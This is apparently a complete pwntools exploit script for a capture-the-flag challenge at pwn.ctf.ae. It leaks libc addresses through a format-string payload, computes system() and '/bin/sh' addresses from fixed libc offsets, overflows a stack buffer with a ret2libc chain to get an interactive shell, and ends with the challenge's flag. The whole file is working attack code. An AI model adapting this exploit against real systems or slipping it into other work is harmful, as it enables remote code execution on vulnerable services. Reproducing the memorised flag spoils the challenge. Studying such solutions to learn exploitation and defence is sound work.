#!/usr/bin/env python3
from pwn import *
import sys

# context.log_level = "DEBUG"
# p = process(chal)
p = remote("pwn.ctf.ae", 9815)

p.recv()	# prompt

""" libc leak """
# pl = '|'.join(['%p']*20)
# pl = '|'.join([ f'%{i}$p' for i in range(20, 30)])
pl = '|%2$p|%23$p'	# leaks the addr of [ stdin | printf ]
p.sendline(pl)

leak = p.recvline().strip().split(b'|')
# print(leak)

""" local """
"""
stdin = int(leak[1], 16)
libc_base = stdin-2028864
system = libc_base + 283024
shell = libc_base + 1657926
"""

""" libc and offsets
https://libc.blukat.me/?q=printf%3A0xf7dc6c60%2C_IO_2_1_stdin_%3A0xf7f4b5c0&l=libc6-i386_2.27-3ubuntu1.4_amd64
"""

system_offset = 0x03ce10
stdin_offset = 0x1d55c0
shell_offset = 0x17b88f

stdin = int(leak[1], 16)
libc_base = stdin - stdin_offset
system = libc_base + system_offset
shell = libc_base + shell_offset

log.success(f"LIBC_BASE: 0x{libc_base:x}")
log.success(f"SYSTEM: 0x{system:x}")
log.success(f"SHELL: 0x{shell:x}")

# pl = cyclic(500)
pl = b'A'*cyclic_find("laaa")
pl += p32(system)
pl += b"JUNK"
pl += p32(shell)


# pause()
p.recv()		# propmt
p.sendline(pl)
p.interactive()

# CTFAE{ReadyforN3xtSector137}
